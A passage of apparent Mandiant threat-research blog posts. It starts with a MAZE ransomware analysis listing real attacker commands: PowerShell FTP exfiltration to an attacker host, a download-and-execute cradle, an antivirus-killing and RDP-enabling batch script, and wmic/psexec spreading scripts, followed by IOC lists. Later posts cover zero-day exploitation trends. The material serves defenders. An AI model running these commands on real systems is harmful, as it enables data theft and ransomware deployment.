          Data Encrypted for Impact</p> <p>T1490: Inhibit System
        Recovery</p> <p>T1489: Service Stop</p> </td> </tr></tbody></table>
 <h4>Example Commands Observed in MAZE Ransomware Incidents</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>function
          Enum-UsersFolders($PathEnum)<br /> {<br />     $foldersArr =
          'Desktop','Downloads','Documents','AppData/Roaming','AppData/Local'<br />
          <br />     Get-ChildItem -Path $PathEnum'/c$' -ErrorAction
          SilentlyContinue<br />     Get-ChildItem -Path
          $PathEnum'/c$/Program Files' -ErrorAction
          SilentlyContinue<br />     Get-ChildItem -Path
          $PathEnum'/c$/Program Files (x86)' -ErrorAction
          SilentlyContinue<br /> <br />     foreach($Directory in
          Get-ChildItem -Path $PathEnum'/c$/Users' -ErrorAction
          SilentlyContinue) {<br /> <br />         foreach($SeachDir in
          $foldersArr) {<br />             Get-ChildItem -Path
          $PathEnum'/c$/Users/'$Directory'/'$SeachDir -ErrorAction
          SilentlyContinue<br />         }<br />     }<br /> }</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">PowerShell reconnaissance script used to
    enumerate directories</span></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624"
          valign="top"><p>$Dir=&quot;C:/Windows/Temp/&quot;<br /> #ftp
          server<br /> $ftp = &quot;ftp://&lt;IP
          Address&gt;/incoming/&quot;<br /> $user =
          &quot;&lt;username&gt;&quot;<br /> $pass =
          &quot;&lt;password&gt;&quot;<br /> $webclient = New-Object
          System.Net.WebClient<br /> $webclient.Credentials = New-Object
          System.Net.NetworkCredential($user,$pass)<br /> #list every
          sql server trace file<br /> foreach($item in (dir $Dir
          &quot;*.7z&quot;)){<br />    &quot;Uploading
          $item...&quot;<br />    $uri = New-Object
          System.Uri($ftp+$item.Name)<br />  
           $webclient.UploadFile($uri, $item.FullName)<br /> }</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Decoded FTP upload PowerShell script</span></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>powershell -nop -exec bypass IEX
          (New-Object
          Net.Webclient).DownloadString('http://127.0.0.1:43984/');
          Add-FtpFile -ftpFilePath &quot;ftp://&lt;IP 
          Address&gt;/cobalt_uploads/&lt;file name&gt;&quot; -localFile
          &quot;&lt;local file path&gt;\ &lt;file name&gt; &quot;
          -userName &quot;&lt;username&gt;&quot; -password
        &quot;&lt;password&gt;&quot;</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Decoded FTP upload PowerShell script</span></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>[…]<br /> echo 7<br /> echo
          7<br /> taskkill /im csrss_tc.exe /f<br /> taskkill /im
          kwsprod.exe /f<br /> taskkill /im avkwctl.exe /f<br />
          taskkill /im rnav.exe /f<br /> taskkill /im crssvc.exe
          /f<br /> sc config CSAuth start= disabled<br /> taskkill /im
          vsserv.exe /f<br /> taskkill /im ppmcativedetection.exe
          /f<br /> […]<br /> taskkill /im sahookmain.exe /f<br />
          taskkill /im mcinfo.exe /f<br /> reg add
          &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
          Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f<br />
          netsh advfirewall firewall set rule group=&quot;remote
          desktop&quot; new enable=Ye<br /> c:\windows\temp\sss.exe</p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Excerpt from windows.bat kill script</span></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>start copy sss.exe \\&lt;internal
          IP&gt;\c$\windows\temp\<br /> start copy sss.exe
          \\&lt;internal IP&gt;\c$\windows\temp\<br /> <br /> start copy
          windows.bat \\&lt;internal IP&gt;\c$\windows\temp\<br /> start
          copy windows.bat \\&lt;internal IP&gt;\c$\windows\temp\<br />
          <br /> start wmic /node:&quot;&lt;internal IP&gt;&quot;
          /user:&quot;&lt;<i>DOMAIN\adminaccount</i>&gt;&quot;
          /password:&quot;&lt;<i>password</i>&gt;&quot; process call
          create &quot;c:\windows\temp\sss.exe&quot;</p> <p>start wmic
          /node:&quot;&lt;internal IP&gt;&quot;
          /user:&quot;&lt;<i>DOMAIN\adminaccount&gt;</i>&quot;
          /password:&quot;&lt;<i>password</i>&gt;&quot; process call
          create &quot;c:\windows\temp\sss.exe&quot;<br /> <br /> start
          wmic /node:&quot;&lt;internal IP&gt;&quot;
          /user:&quot;&lt;DOMAIN\adminaccount&gt;&quot;
          /password:&quot;&lt;<i>password</i>&gt;&quot; process call
          create &quot;cmd.exe /c c:\windows\temp\windows.bat&quot;</p>
          <p>start wmic /node:&quot;&lt;internal IP&gt;&quot;
          /user:&quot;&lt;<i>DOMAIN\adminaccount</i>&gt;&quot;
          /password:&quot;&lt;<i>password</i>&gt;&quot; process call
          create &quot;cmd.exe /c
          c:\windows\temp\windows.bat&quot;<br /> <br /> start wmic
          /node:&quot;&lt;internal IP&gt;&quot;
          /user:&quot;&lt;<i>DOMAIN\adminaccount</i>&gt;&quot;
          /password:&quot;&lt;<i>password</i>&gt;&quot; process call
          create &quot;cmd.exe /c copy \\&lt;internal
          IP&gt;\c$\windows\temp\sss.exe c:\windows\temp\&quot;</p>
          <p>start wmic /node:&quot;&lt;internal IP&gt;&quot;
          /user:&quot;&lt;<i>DOMAIN\adminaccount</i>&gt;&quot;
          /password:&quot;&lt;<i>password</i>&gt;&quot; process call
          create &quot;cmd.exe /c copy \\&lt;internal
          IP&gt;\c$\windows\temp\sss.exe c:\windows\temp\&quot;<br />
          <br /> start wmic /node:&quot;&lt;internal IP&gt;&quot;
          /user:&quot;&lt;<i>DOMAIN\adminaccount</i>&gt;&quot;
          /password:&quot;&lt;<i>password</i>&gt;&quot; process call
          create &quot;cmd.exe /c copy \\&lt;internal
          IP&gt;\c$\windows\temp\windows.bat c:\windows\temp\&quot;</p>
          <p>start wmic /node:&quot;&lt;internal IP&gt;&quot;
          /user:&quot;&lt;<i>DOMAIN\adminaccount</i>&gt;&quot;
          /password:&quot;&lt;<i>password</i>&gt;&quot; process call
          create &quot;cmd.exe /c copy \\&lt;internal
          IP&gt;\c$\windows\temp\windows.bat c:\windows\temp\&quot;</p>
          <p>start psexec.exe \\&lt;internal IP&gt; -u
          &lt;<i>DOMAIN\adminaccount</i>&gt; -p
          &quot;&lt;<i>password</i>&gt;&quot; -d -h -r rtrsd -s
          -accepteula -nobanner c:\windows\temp\sss.exe</p> <p>start
          psexec.exe \\&lt;internal IP&gt; -u
          &lt;<i>DOMAIN\adminaccount</i>&gt; -p
          &quot;&lt;<i>password</i>&gt;&quot; -d -h -r rtrsd -s
          -accepteula -nobanner c:\windows\temp\sss.exe</p> <p>start
          psexec.exe \\&lt;internal IP&gt; -u
          &lt;<i>DOMAIN\adminaccount</i>&gt; -p
          &quot;&lt;<i>password</i>&gt;&quot; -d -h -r rtrsd -s
          -accepteula -nobanner c:\windows\temp\windows.bat</p> <p>start
          psexec.exe \\&lt;internal IP&gt; -u &lt;<i>
            <u>DOMAIN\adminaccount&gt;</u></i> -p
          &quot;&lt;<i>password</i>&gt;&quot; -d -h -r rtrsd -s
          -accepteula -nobanner c:\windows\temp\windows.bat</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Example commands from MAZE distribution scripts</span></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><p>@echo off<br /> del done.txt<br />
          del offline.txt<br /> rem Loop thru list of computer names in
          file specified on command-line<br /> for /f %%i in (%1) do
          call :check_machine %%i<br /> goto end<br />
          :check_machine<br /> rem Check to see if machine is up.<br />
          ping -n 1 %1|Find &quot;TTL=&quot; &gt;NUL 2&gt;NUL<br /> if
          errorlevel 1 goto down<br /> echo %1<br /> START cmd /c
          &quot;copy [Location of MAZE binary] \\%1\c$\windows\temp
          &amp;&amp; exit&quot;<br /> timeout 1 &gt; NUL<br /> echo %1
          &gt;&gt; done.txt<br /> rem wmic /node:&quot;%1&quot; process
          call create &quot;regsvr32.exe /i C:\windows\temp\[MAZE binary
          name]&quot; &gt;&gt; done.txt<br /> START &quot;&quot; cmd /c
          &quot;wmic /node:&quot;%1&quot; process call create
          &quot;regsvr32.exe /i C:\windows\temp\[MAZE binary name]&quot;
          &amp;&amp; exit&quot;<br /> goto end<br /> :down<br />   rem
          Report machine down<br />   echo %1 &gt;&gt; offline.txt<br />
        :end</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Example MAZE distribution script</span></p>
 <h4>Indicators of Compromise</h4>
 <table border="1" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="200" valign="top"><p>Maze Payloads</p> </td> <td
        width="424" valign="top"><p>064058cf092063a5b69ed8fd2a1a04fe</p>
        <p>0f841c6332c89eaa7cac14c9d5b1d35b</p>
        <p>108a298b4ed5b4e77541061f32e55751</p>
        <p>11308e450b1f17954f531122a56fae3b</p>
        <p>15d7dd126391b0e7963c562a6cf3992c</p>
        <p>21a563f958b73d453ad91e251b11855c</p>
        <p>27c5ecbb94b84c315d56673a851b6cf9</p>
        <p>2f78ff32cbb3c478865a88276248d419</p>
        <p>335aba8d135cc2e66549080ec9e8c8b7</p>
        <p>3bfcba2dd05e1c75f86c008f4d245f62</p>
        <p>46b98ee908d08f15137e509e5e69db1b</p>
        <p>5774f35d180c0702741a46d98190ff37</p>
        <p>5df79164b6d0661277f11691121b1d53</p>
        <p>658e9deec68cf5d33ee0779f54806cc2</p>
        <p>65cf08ffaf12e47de8cd37098aac5b33</p>
        <p>79d137d91be9819930eeb3876e4fbe79</p>
        <p>8045b3d2d4a6084f14618b028710ce85</p>
        <p>8205a1106ae91d0b0705992d61e84ab2</p>
        <p>83b8d994b989f6cbeea3e1a5d68ca5d8</p>
        <p>868d604146e7e5cb5995934b085846e3</p>
        <p>87239ce48fc8196a5ab66d8562f48f26</p>
        <p>89e1ddb8cc86c710ee068d6c6bf300f4</p>
        <p>910aa49813ee4cc7e4fa0074db5e454a</p>
        <p>9eb13d56c363df67490bcc2149229e4c</p>
        <p>a0c5b4adbcd9eb6de9d32537b16c423b</p>
        <p>a3a3495ae2fc83479baeaf1878e1ea84</p>
        <p>b02be7a336dcc6635172e0d6ec24c554</p>
        <p>b40a9eda37493425782bda4a3d9dad58</p>
        <p>b4d6cb4e52bb525ebe43349076a240df</p>
        <p>b6786f141148925010122819047d1882</p>
        <p>b93616a1ea4f4a131cc0507e6c789f94</p>
        <p>bd9838d84fd77205011e8b0c2bd711e0</p>
        <p>be537a66d01c67076c8491b05866c894</p>
        <p>bf2e43ff8542e73c1b27291e0df06afd</p>
        <p>c3ce5e8075f506e396ee601f2757a2bd</p>
        <p>d2dda72ff2fbbb89bd871c5fc21ee96a</p>
        <p>d3eaab616883fcf51dcbdb4769dd86df</p>
        <p>d552be44a11d831e874e05cadafe04b6</p>
        <p>deebbea18401e8b5e83c410c6d3a8b4e</p>
        <p>dfa4631ec2b8459b1041168b1b1d5105</p>
        <p>e57ba11045a4b7bc30bd2d33498ef194</p>
        <p>e69a8eb94f65480980deaf1ff5a431a6</p>
        <p>ef95c48e750c1a3b1af8f5446fa04f54</p>
        <p>f04d404d84be66e64a584d425844b926</p>
        <p>f457bb5060543db3146291d8c9ad1001</p>
        <p>f5ecda7dd8bb1c514f93c09cea8ae00d</p>
        <p>f83cef2bf33a4d43e58b771e81af3ecc</p>
        <p>fba4cbb7167176990d5a8d24e9505f71</p> </td> </tr>
    <tr>
      <td width="200" valign="top"><p>Maze Check-in IPs</p> </td> <td
        width="424" valign="top"><p>91.218.114.11</p>
        <p>91.218.114.25</p> <p>91.218.114.26</p> <p>91.218.114.31</p>
        <p>91.218.114.32</p> <p>91.218.114.37</p> <p>91.218.114.38</p>
        <p>91.218.114.4</p> <p>91.218.114.77</p> <p>91.218.114.79</p>
        <p>92.63.11.151</p> <p>92.63.15.6 </p> <p>92.63.15.8 </p>
        <p>92.63.17.245</p> <p>92.63.194.20</p> <p>92.63.194.3</p>
        <p>92.63.29.137</p> <p>92.63.32.2 </p> <p>92.63.32.52</p>
        <p>92.63.32.55</p> <p>92.63.32.57</p> <p>92.63.37.100</p>
        <p>92.63.8.47</p> </td> </tr>
    <tr>
      <td width="200" valign="top"><p>Maze-related Domains</p> </td> <td
        width="424" valign="top"><p>aoacugmutagkwctu[.]onion</p>
        <p>mazedecrypt[.]top </p> <p>mazenews[.]top</p>
        <p>newsmaze[.]top</p> </td> </tr>
    <tr>
      <td width="200" valign="top"><p>Maze Download URLs</p> </td> <td
        width="424"
        valign="top"><p>http://104.168.174.32/wordupd_3.0.1.tmp</p>
        <p>http://104.168.198.208/wordupd.tmp</p>
        <p>http://104.168.201.35/dospizdos.tmp</p>
        <p>http://104.168.201.47/wordupd.tmp</p>
        <p>http://104.168.215.54/wordupd.tmp</p>
        <p>http://149.56.245.196/wordupd.tmp</p>
        <p>http://192.119.106.235/mswordupd.tmp</p>
        <p>http://192.119.106.235/officeupd.tmp</p>
        <p>http://192.99.172.143/winupd.tmp</p>
        <p>http://54.39.233.188/win163.65.tmp</p>
        <p>http://91.208.184.174:8079/windef.exe</p>
        <p>http://agenziainformazioni[.]icu/wordupd.tmp</p>
        <p>http://www.download-invoice[.]site/Invoice_29557473.exe</p>
      </td> </tr>
    <tr>
      <td width="200" valign="top"><p>Malicious Documents</p> </td> <td
        width="424" valign="top"><p>1a26c9b6ba40e4e3c3dce12de266ae10</p>
        <p>53d5bdc6bd7904b44078cf80e239d42b</p>
        <p>79271dc08052480a578d583a298951c5</p>
        <p>a2d631fcb08a6c840c23a8f46f6892dd</p>
        <p>ad30987a53b1b0264d806805ce1a2561</p>
        <p>c09af442e8c808c953f4fa461956a30f</p>
        <p>ee26e33725b14850b1776a67bd8f2d0a</p> </td> </tr>
    <tr>
      <td width="200" valign="top"><p>BEACON C2s</p> </td> <td
        width="424" valign="top"><p>173.209.43.61</p>
        <p>193.36.237.173</p> <p>37.1.213.9</p> <p>37.252.7.142</p>
        <p>5.199.167.188</p> <p>checksoffice[.]me</p>
        <p>drivers.updatecenter[.]icu</p> <p>plaintsotherest[.]net</p>
        <p>thesawmeinrew[.]net</p> <p>updates.updatecenter[.]icu</p>
      </td> </tr>
    <tr>
      <td width="200" valign="top"><p>Cobalt Strike Binaries</p> </td>
        <td width="424"
        valign="top"><p>7507fe19afbda652e9b2768c10ad639f</p>
        <p>a93b86b2530cc988f801462ead702d84</p>
        <p>4f57e35a89e257952c3809211bef78ea</p>
        <p>bad6fc87a98d1663be0df23aedaf1c62</p>
        <p>f5ef96251f183f7fc63205d8ebf30cbf</p>
        <p>c818cc38f46c604f8576118f12fd0a63</p>
        <p>078cf6db38725c37030c79ef73519c0c</p>
        <p>c255daaa8abfadc12c9ae8ae2d148b31</p>
        <p>1fef99f05bf5ae78a28d521612506057</p>
        <p>cebe4799b6aff9cead533536b09fecd1</p>
        <p>4ccca6ff9b667a01df55326fcc850219</p>
        <p>bad6fc87a98d1663be0df23aedaf1c62</p> </td> </tr>
    <tr>
      <td width="200" valign="top"><p>Meterpreter C2s</p> </td> <td
        width="424" valign="top"><p>5.199.167.188</p> </td> </tr>
    <tr>
      <td width="200" valign="top"><p>Other Related Files</p> </td> <td
        width="424" valign="top"><p>3A5A9D40D4592C344920DD082029B362
          (related script)</p> <p>76f8f28bd51efa03ab992fdb050c8382 (MAZE
          execution artifact)</p> <p>b5aa49c1bf4179452a85862ade3ef317
          (windows.bat kill script) </p>
          <p>fad3c6914d798e29a3fd8e415f1608f4 (related script)</p> </td> </tr>
    <tr>
      <td width="200" valign="top"><p>Tools &amp; Utilities</p> </td>
        <td width="424" valign="top"><p>27304b246c7d5b4e149124d5f93c5b01
        (PsExec)</p> <p>42badc1d2f03a8b1e4875740d3d49336 (7zip)</p>
          <p>75b55bb34dac9d02740b9ad6b6820360 (PsExec)</p>
          <p>9b02dd2a1a15e94922be3f85129083ac (AdFind)</p>
          <p>c621a9f931e4ebf37dace74efcce11f2 (SMBTools)</p>
          <p>f413b4a2242bb60829c9a470eea4dfb6 (winRAR) </p> </td> </tr>
    <tr>
      <td width="200" valign="top"><p>Email Sender Domains</p> </td> <td
        width="424" valign="top"><p>att-customer[.]com</p>
        <p>att-information[.]com</p> <p>att-newsroom[.]com</p>
        <p>att-plans[.]com</p> <p>bezahlen-1und1[.]icu</p>
        <p>bzst-info[.]icu</p> <p>bzst-inform[.]icu</p>
        <p>bzstinfo[.]icu</p> <p>bzstinform[.]icu</p>
        <p>canada-post[.]icu</p> <p>canadapost-delivery[.]icu</p>
        <p>canadapost-tracking[.]icu</p> <p>hilfe-center-1und1[.]icu</p>
        <p>hilfe-center-internetag[.]icu</p>
        <p>trackweb-canadapost[.]icu</p> </td> </tr>
    <tr>
      <td width="200" valign="top"><p>Sender Domain Registrant
        Addresses</p> </td> <td width="424"
        valign="top"><p>abusereceive@hitler.rocks</p>
        <p>gladkoff1991@yandex.ru</p> </td> </tr></tbody></table>
 <p>Mandiant Threat Intelligence will host an exclusive webinar on
  Thursday, May 21, 2020, at 8 a.m. PT / 11 a.m. ET to provide updated
  insight and information into the MAZE ransomware threat, and to answer
  questions from attendees. <a
    href="https://www.brighttalk.com/webcast/10469/408167">Register
  today</a> to reserve your spot.</p>
http://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html2020-05-07T23:00:00.000Z2020-07-24T06:58:43.749ZZero-Day Exploitation Increasingly Demonstrates Access to Money, Rather
than Skill — Intelligence for Vulnerability Management, Part Onenoemail@noemail.orgKathleen Metrick<p>
  <i>One of the critical strategic and tactical roles that cyber threat
    intelligence (CTI) plays is in the tracking, analysis, and
    prioritization of software vulnerabilities that could potentially
    put an organization’s data, employees and customers at risk. In this
    four-part blog series, <a
      href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">FireEye
      Mandiant Threat Intelligence</a> highlights the value of CTI in
    enabling vulnerability management, and unveils new research into the
    latest threats, trends and recommendations.</i></p>
 <p>FireEye Mandiant Threat Intelligence documented more zero-days
  exploited in 2019 than any of the previous three years. While not
  every instance of zero-day exploitation can be attributed to a tracked
  group, we noted that a wider range of tracked actors appear to have
  gained access to these capabilities. Furthermore, we noted a
  significant increase over time in the number of zero-days leveraged by
  groups suspected to be customers of companies that supply offensive
  cyber capabilities, as well as an increase in zero-days used against
  targets in the Middle East, and/or by groups with suspected ties to
  this region. Going forward, we are likely to see a greater variety of
  actors using zero-days, especially as private vendors continue feeding
  the demand for offensive cyber weapons.</p>
 <h4>Zero-Day Usage by Country and Group</h4>
 <p>Since late 2017, FireEye Mandiant Threat Intelligence noted a
  significant increase in the number of zero-days leveraged by groups
  that are known or suspected to be customers of private companies that
  supply offensive cyber tools and services. Additionally, we observed
  an increase in zero-days leveraged against targets in the Middle East,
  and/or by groups with suspected ties to this region.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/intelvuln1/Picture1.png" alt="" /></p>
 <p>Examples include:</p>
 <ul> <li>A group described by researchers as <a
      href="https://citizenlab.ca/2016/05/stealth-falcon/"
      title="https://citizenlab.ca/2016/05/stealth-falcon/">Stealth
      Falcon</a> and <a
      href="https://www.securityweek.com/windows-zero-day-exploited-fruityarmor-sandcat-threat-groups"
    title="https://www.securityweek.com/windows-zero-day-exploited-fruityarmor-sandcat-threat-groups">FruityArmor</a> is
    an espionage group that has reportedly <a
      href="https://www.welivesecurity.com/2019/09/09/backdoor-stealth-falcon-group/">targeted
      journalists and activists in the Middle East</a>. In 2016, this
    group used malware sold by NSO group, which leveraged three iOS
    zero-days. From 2016 to 2019, this group used more zero-days than
    any other group.</li> <li>The activity dubbed SandCat in open
    sources, suspected to be linked to <a
      href="https://www.vice.com/en_us/article/3kx5y3/uzbekistan-hacking-operations-uncovered-due-to-spectacularly-bad-opsec">Uzbekistan
      state intelligence</a>, has been observed using zero-days in
    operations against targets in the Middle East. This group may have
    acquired their zero-days by purchasing malware from private
    companies such as NSO group, as the zero-days used in SandCat
    operations were also used in Stealth Falcon operations, and it is
    unlikely that these distinct activity sets independently discovered
    the same three zero-days.</li> <li>Throughout 2016 and 2017,
    activity referred to in open sources as <a
    href="https://www.securityweek.com/middle-east-group-uses-flash-zero-day-deliver-spyware">BlackOasis</a>,
    which also primarily targets entities in the Middle East and likely
    acquired at least one zero-day in the past from <a
      href="https://www.cyberscoop.com/middle-eastern-hacking-group-using-finfisher-malware-conduct-international-espionage/">private
      company Gamma Group</a>, demonstrated similarly frequent access to
    zero-day vulnerabilities.</li> </ul>
 <p>We also noted examples of zero-day exploitation that have not been
  attributed to tracked groups but that appear to have been leveraged in
  tools provided by private offensive security companies, for instance:</p>
 <ul> <li>In 2019, a zero-day exploit in WhatsApp (CVE-2019-3568) was <a
      href="https://www.itpro.co.uk/spyware/33632/whatsapp-call-hack-installs-spyware-on-users-phones">reportedly
      used to distribute spyware</a> developed by NSO group, an Israeli
    software company.</li> <li>FireEye analyzed activity targeting a
    Russian healthcare organization that leveraged a 2018 Adobe Flash
    zero-day (CVE-2018-15982) that may be linked to leaked source code
    of Hacking Team.</li> <li>Android zero-day vulnerability
    CVE-2019-2215 was <a
      href="https://thehackernews.com/2019/10/android-kernel-vulnerability.html">reportedly
      being exploited in the wild</a> in October 2019 by NSO Group
  tools.</li> </ul>
 <p>
  <i>Zero-Day Exploitation by Major Cyber Powers</i></p>
 <p>We have continued to see exploitation of zero days by espionage
  groups of major cyber powers.</p>
 <ul> <li>According to researchers, the Chinese espionage group APT3
    exploited CVE-2019-0703 in <a
      href="https://www.symantec.com/blogs/threat-intelligence/buckeye-windows-zero-day-exploit">targeted
      attacks in 2016</a>.</li> <li>FireEye observed North Korean group
    APT37 conduct a 2017 campaign that leveraged Adobe Flash
    vulnerability CVE-2018-4878. This group has also demonstrated an
    increased capacity to quickly exploit vulnerabilities shortly after
    they have been disclosed.</li> <li>From December 2017 to January
    2018, we observed multiple Chinese groups leveraging CVE-2018-0802
    in a campaign targeting multiple industries throughout Europe,
    Russia, Southeast Asia, and Taiwan. At least three out of six
    samples were used before the patch for this vulnerability was
  issued.</li> <li>In 2017, Russian groups <a
      href="/content/fireeye-www/en_US/blog/threat-research/2017/05/eps-processing-zero-days.html">APT28
      and Turla leveraged multiple zero-days</a> in Microsoft Office
  products. </li> </ul>
 <p>In addition, we believe that some of the most dangerous state
  sponsored intrusion sets are increasingly demonstrating the ability to
  quickly exploit vulnerabilities that have been made public. In
  multiple cases, groups linked to these countries have been able to
  weaponize vulnerabilities and incorporate them into their operations,
  aiming to take advantage of the window between disclosure and patch application. </p>
 <p>
  <i>Zero-Day Use by Financially Motivated Actors</i></p>
 <p>Financially motivated groups have and continue to <a
    href="/content/fireeye-www/en_US/blog/threat-research/2016/05/windows-zero-day-payment-cards.html">leverage
    zero-days in their operations</a>, though with less frequency than
  espionage groups.</p>
 <p>In May 2019, we reported that FIN6 used a Windows server 2019
  use-after-free zero-day (CVE-2019-0859) in a targeted intrusion in
  February 2019. Some evidence suggests that the group may have used the
  exploit since August 2018. While open sources have suggested that the
  group potentially acquired the zero-day from criminal underground
  actor &quot;<a
  href="https://www.ibtimes.com/hacker-selling-windows-zero-days-worlds-most-dangerous-hacker-groups-2789374">BuggiCorp</a>,&quot;
  we have not identified direct evidence linking this actor to this
  exploit's development or sale.</p>
 <h4>Conclusion</h4>
 <p>We surmise that access to zero-day capabilities is becoming
  increasingly commodified based on the proportion of zero-days
  exploited in the wild by suspected customers of private companies.
  Possible reasons for this include:</p>
 <ul> <li>Private companies are likely creating and supplying a larger
    proportion of zero-days than they have in the past, resulting in a
    concentration of zero-day capabilities among highly resourced
  groups.</li> <li>Private companies may be increasingly providing
    offensive capabilities to groups with lower overall capability
    and/or groups with less concern for operational security, which
    makes it more likely that usage of zero-days will be observed.</li> </ul>
 <p>It is likely that state groups will continue to support internal
  exploit discovery and development; however, the availability of
  zero-days through private companies may offer a more attractive option
  than relying on domestic solutions or underground markets. As a
  result, we expect that the number of adversaries demonstrating access
  to these kinds of vulnerabilities will almost certainly increase and
  will do so at a faster rate than the growth of their overall offensive
  cyber capabilities—provided they have the ability and will to spend
  the necessary funds.</p>
 <p>Register today to hear FireEye Mandiant Threat Intelligence experts
  discuss the latest in <a
    href="https://www.brighttalk.com/webcast/7451/392772">vulnerability
    threats, trends and recommendations</a> in our upcoming April 30 webinar. </p>
 <p>
  <i>Sourcing Note: Some vulnerabilities and zero-days were identified
    based on FireEye research, Mandiant breach investigation findings,
    and other technical collections. This paper also references
    vulnerabilities and zero-days discussed in open sources including </i>
  <a
      href="https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/view#gid=1123292625"><i>Google
      Project Zero's zero-day &quot;In the Wild&quot; Spreadsheet</i></a>
  <i>. While we believe these sources are reliable as used in this
    paper, we do not vouch for the complete findings of those sources.
    Due to the ongoing discovery of past incidents, we expect that this
    research will remain dynamic.</i></p>
http://www.fireeye.com/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html2020-04-06T12:00:00.000Z2020-07-24T06:58:43.737ZThink Fast: Time Between Disclosure, Patch Release and Vulnerability
Exploitation — Intelligence for Vulnerability Management, Part Twonoemail@noemail.orgKathleen Metrick<p>
  <i>One of the critical strategic and tactical roles that cyber threat
    intelligence (CTI) plays is in the tracking, analysis, and
    prioritization of software vulnerabilities that could potentially
    put an organization’s data, employees and customers at risk. In this
    four-part blog series, <a
      href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">FireEye
      Mandiant Threat Intelligence</a> highlights the value of CTI in
    enabling vulnerability management, and unveils new research into the
    latest threats, trends and recommendations. Check out our first post
    on <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html">zero-day vulnerabilities</a>.</i></p>
 <p>Attackers are in a constant race to exploit newly discovered
  vulnerabilities before defenders have a chance to respond. FireEye
  Mandiant Threat Intelligence research into vulnerabilities exploited
  in 2018 and 2019 suggests that the majority of exploitation in the
  wild occurs before patch issuance or within a few days of a patch
  becoming available.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Percentage of vulnerabilities
    exploited at various times in relation to patch release</span></p>
 <p>FireEye Mandiant Threat Intelligence analyzed 60 vulnerabilities
  that were either exploited or assigned a CVE number between Q1 2018 to
  Q3 2019. The majority of vulnerabilities were exploited as zero-days –
  before a patch was available. More than a quarter were exploited
  within one month after the patch date. Figure 2 illustrates the number
  of days between when a patch was made available and the first observed
  exploitation date for each vulnerability.</p>
 <p>We believe these numbers to be conservative estimates, as we relied
  on the first reported exploitation of a vulnerability linked to a
  specific date. Frequently, first exploitation dates are not publicly
  disclosed. It is also likely that in some cases exploitation occurred
  without being discovered before researchers recorded exploitation
  attached to a certain date.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Time between vulnerability
    exploitation and patch issuance</span></p>
 <p>­­­<i>Time Between Disclosure and Patch Release</i></p>
 <p>The average time between disclosure and patch availability was
  approximately 9 days. This average is slightly inflated by
  vulnerabilities such as CVE-2019-0863, a Microsoft Windows server
  vulnerability, which was disclosed in December 2018 and not patched
  until 5 months later in May 2019. The majority of these
  vulnerabilities, however, were patched quickly after disclosure. In
  59% of cases, a patch was released on the same day the vulnerability
  was disclosed. These metrics, in combination with the observed
  swiftness of adversary exploitation activity, highlight the importance
  of responsible disclosure, as it may provide defenders with the slim
  window needed to successfully patch vulnerable systems.</p>
 <p>
  <i>Exploitation After Patch Release</i></p>
 <p>While the majority of the observed vulnerabilities were zero-days,
  42 percent of vulnerabilities were exploited after a patch had been
  released. For these non-zero-day vulnerabilities, there was a very
  small window (often only hours or a few days) between when the patch
  was released and the first observed instance of attacker exploitation.
  Table 1 provides some insight into the race between attackers
  attempting to exploit vulnerable software and organizations attempting
  to deploy the patch.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" colspan="2" valign="top"><p style="text-align: center;">
          <b>Time to Exploit for Vulnerabilities First Exploited after a
        Patch</b></p> </td> </tr>
    <tr>
      <td width="88" valign="top"><p>Hours</p> </td> <td width="535"
          valign="top"><p>Two vulnerabilities were successfully
          exploited within hours of a patch release, CVE-2018-2628 and
        CVE-2018-7602.</p> </td> </tr>
    <tr>
      <td width="88" valign="top"><p>Days</p> </td> <td width="535"
          valign="top"><p>12 percent of vulnerabilities were exploited
          within the first week following the patch release.</p> </td> </tr>
    <tr>
      <td width="88" valign="top"><p>One Month</p> </td> <td width="535"
          valign="top"><p>15 percent of vulnerabilities were exploited
          after one week but within one month of patch release.</p>
      </td> </tr>
    <tr>
      <td width="88" valign="top"><p>Years</p> </td> <td width="535"
          valign="top"><p>In multiple cases, such as the first observed
          exploitation of CVE-2010-1871 and CVE-2012-0874 in 2019,
          attackers exploited vulnerabilities for which a patch had been
          made available many years prior.</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: Exploitation timing for patched
    vulnerabilities ranges from within hours of patch issuance to years
    after initial disclosure</span></p>
 <h4>Case Studies</h4>
 <p>We continue to observe espionage and financially motivated groups
  quickly leveraging publicly disclosed vulnerabilities in their
  operations. The following examples demonstrate the speed with which
  sophisticated groups are able to incorporate vulnerabilities into
